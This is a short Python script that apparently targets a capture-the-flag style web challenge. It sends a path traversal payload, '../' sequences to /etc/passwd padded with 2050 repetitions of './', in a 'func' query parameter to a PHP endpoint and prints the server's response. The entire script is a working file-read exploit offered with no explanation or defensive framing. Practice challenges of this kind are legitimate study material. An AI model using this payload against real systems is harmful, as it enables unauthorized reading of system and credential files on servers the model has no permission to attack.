import requests

url = "https://command-executor.hackme.quest/index.php"
# url = "http://localhost:5555/index.php"
url+="?func=../../../../../../../../../../../../../etc/passwd" 
url+="./" * 2050
print(url)
r = requests.get(url)

print(r.text)